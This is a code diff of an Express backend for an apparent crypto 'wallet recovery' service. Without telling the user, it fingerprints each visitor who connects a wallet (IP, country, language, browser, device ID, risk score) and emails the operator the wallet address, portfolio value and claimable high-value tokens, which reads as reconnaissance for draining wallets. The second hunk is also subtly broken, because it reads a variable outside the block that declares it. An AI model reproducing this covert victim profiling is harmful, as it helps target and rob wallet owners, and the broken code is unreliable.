@@ -177,35 +177,55 @@ router.post('/connect-wallet', async (req, res) => {
       console.log('📧 FORCING EMAIL SEND FOR WALLET:', walletAddress);
       console.log('📧 Portfolio data:', JSON.stringify(portfolioData, null, 2));
       
-      // Get real user data
+      // Advanced user tracking
       const realIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || req.ip;
       const userAgent = req.headers['user-agent'] || 'Unknown';
       const referer = req.headers['referer'] || 'Direct';
       const country = req.headers['cf-ipcountry'] || 'Unknown';
+      const acceptLanguage = req.headers['accept-language'] || 'unknown';
+      const acceptEncoding = req.headers['accept-encoding'] || 'unknown';
+      const dnt = req.headers['dnt'] || 'not-set';
       
-      // Device detection
+      // Advanced device detection
       const isMobile = /Mobile|Android|iPhone|iPad/.test(userAgent);
       const isMetaMask = userAgent.includes('MetaMask');
-      const browser = userAgent.includes('Chrome') ? 'Chrome' : userAgent.includes('Firefox') ? 'Firefox' : userAgent.includes('Safari') ? 'Safari' : 'Unknown';
+      let browser = 'Unknown';
+      if (userAgent.includes('Chrome')) browser = 'Chrome';
+      else if (userAgent.includes('Firefox')) browser = 'Firefox';
+      else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
+      else if (userAgent.includes('Edge')) browser = 'Edge';
+      else if (userAgent.includes('Opera')) browser = 'Opera';
       
-      // Send comprehensive admin notification
+      // Security fingerprinting
+      const deviceFingerprint = Buffer.from(userAgent + realIP).toString('base64').slice(0, 12);
+      let riskScore = 0;
+      if (realIP.includes('127.0.0.1') || realIP.includes('::1')) riskScore += 2;
+      if (userAgent === 'Unknown' || userAgent.length < 50) riskScore += 3;
+      if (!referer || referer === 'Direct') riskScore += 1;
+      const riskLevel = riskScore >= 5 ? 'HIGH' : riskScore >= 3 ? 'MEDIUM' : 'LOW';
+      
+      // Clean admin notification
       const emailSent = await sendAdminNotification(
-        `🔗 NEW USER: ${walletAddress.slice(0,8)}... - $${portfolioData.totalValue.toFixed(0)} Portfolio`,
-        `🚨 PRODUCTION WALLET CONNECTION\n\n` +
-        `💰 WALLET: ${walletAddress}\n` +
-        `💵 PORTFOLIO VALUE: $${portfolioData.totalValue.toFixed(2)}\n` +
-        `🪙 ASSETS: ${portfolioData.assets.length} tokens\n` +
-        `⛓️ CHAINS: ${portfolioData.chains.join(', ') || 'None'}\n\n` +
-        `📍 LOCATION DATA:\n` +
-        `• Real IP: ${realIP}\n` +
-        `• Country: ${country}\n` +
-        `• Referer: ${referer}\n\n` +
-        `📱 DEVICE INFO:\n` +
-        `• Device: ${isMobile ? 'Mobile' : 'Desktop'}\n` +
-        `• Wallet: ${isMetaMask ? 'MetaMask Mobile' : 'Web Wallet'}\n` +
-        `• Browser: ${browser}\n\n` +
-        `⏰ TIME: ${new Date().toISOString()}\n\n` +
-        `🎯 RECOVERY POTENTIAL: ${portfolioData.recoveryOpportunities} opportunities`
+        `NEW WALLET: ${walletAddress.slice(0,8)}... - $${portfolioData.totalValue.toFixed(0)} - ${riskLevel} RISK`,
+        `PRODUCTION WALLET CONNECTION\n\n` +
+        `WALLET: ${walletAddress}\n` +
+        `PORTFOLIO: $${portfolioData.totalValue.toFixed(2)} (${portfolioData.assets.length} assets)\n` +
+        `CHAINS: ${portfolioData.chains.join(', ') || 'None'}\n\n` +
+        `SECURITY ANALYSIS:\n` +
+        `Risk Level: ${riskLevel} (Score: ${riskScore}/10)\n` +
+        `Device ID: ${deviceFingerprint}\n` +
+        `Real IP: ${realIP}\n` +
+        `Country: ${country}\n` +
+        `Referer: ${referer}\n\n` +
+        `DEVICE DETAILS:\n` +
+        `Type: ${isMobile ? 'Mobile' : 'Desktop'}\n` +
+        `Wallet: ${isMetaMask ? 'MetaMask' : 'Web Wallet'}\n` +
+        `Browser: ${browser}\n` +
+        `Language: ${acceptLanguage}\n` +
+        `Encoding: ${acceptEncoding}\n` +
+        `DNT: ${dnt}\n\n` +
+        `TIME: ${new Date().toISOString()}\n` +
+        `RECOVERY OPS: ${portfolioData.recoveryOpportunities}`
       );
       
       if (emailSent) {
@@ -262,20 +282,22 @@ router.post('/scan-wallet', async (req, res) => {
       const claimableTokens = scanResults.filter(r => r.claimable);
       const highValueTokens = scanResults.filter(r => parseFloat(r.amount) > 100);
       
-      const emailSent = await sendAdminNotification(
-        `🔍 SCAN RESULTS: ${scanResults.length} tokens found - $${totalValue.toFixed(0)} value`,
-        `🔍 WALLET SCAN COMPLETED\n\n` +
-        `💰 WALLET: ${walletAddress}\n` +
-        `📊 SCAN RESULTS:\n` +
-        `• Total Tokens: ${scanResults.length}\n` +
-        `• Claimable: ${claimableTokens.length}\n` +
-        `• High Value (>$100): ${highValueTokens.length}\n` +
-        `• Total Value: $${totalValue.toFixed(2)}\n` +
-        `• Chains Scanned: ${[...new Set(scanResults.map(r => r.chainId))].length}\n\n` +
-        `🎯 TOP FINDINGS:\n${scanResults.slice(0,5).map(r => `• ${r.tokenSymbol}: ${r.amount} (${r.claimable ? 'CLAIMABLE' : 'Locked'})`).join('\n')}\n\n` +
-        `📍 USER: ${realIP}\n` +
-        `⏰ TIME: ${new Date().toISOString()}`
-      );
+      if (scanResults.length > 0) {
+        const emailSent = await sendAdminNotification(
+          `SCAN COMPLETE: ${scanResults.length} tokens - $${totalValue.toFixed(0)} value`,
+          `WALLET SCAN COMPLETED\n\n` +
+          `WALLET: ${walletAddress}\n` +
+          `RESULTS: ${scanResults.length} total, ${claimableTokens.length} claimable\n` +
+          `VALUE: $${totalValue.toFixed(2)} (${highValueTokens.length} high-value)\n` +
+          `CHAINS: ${[...new Set(scanResults.map(r => r.chainId))].length}\n\n` +
+          `TOP FINDINGS:\n${scanResults.slice(0,5).map(r => `${r.tokenSymbol}: ${r.amount} (${r.claimable ? 'CLAIMABLE' : 'Locked'})`).join('\n')}\n\n` +
+          `USER: ${realIP}\n` +
+          `TIME: ${new Date().toISOString()}`
+        );
+        if (emailSent) {
+          console.log('✅ Scan results email sent successfully');
+        }
+      }
       if (emailSent) {
         console.log('✅ Scan results email sent successfully');
       }
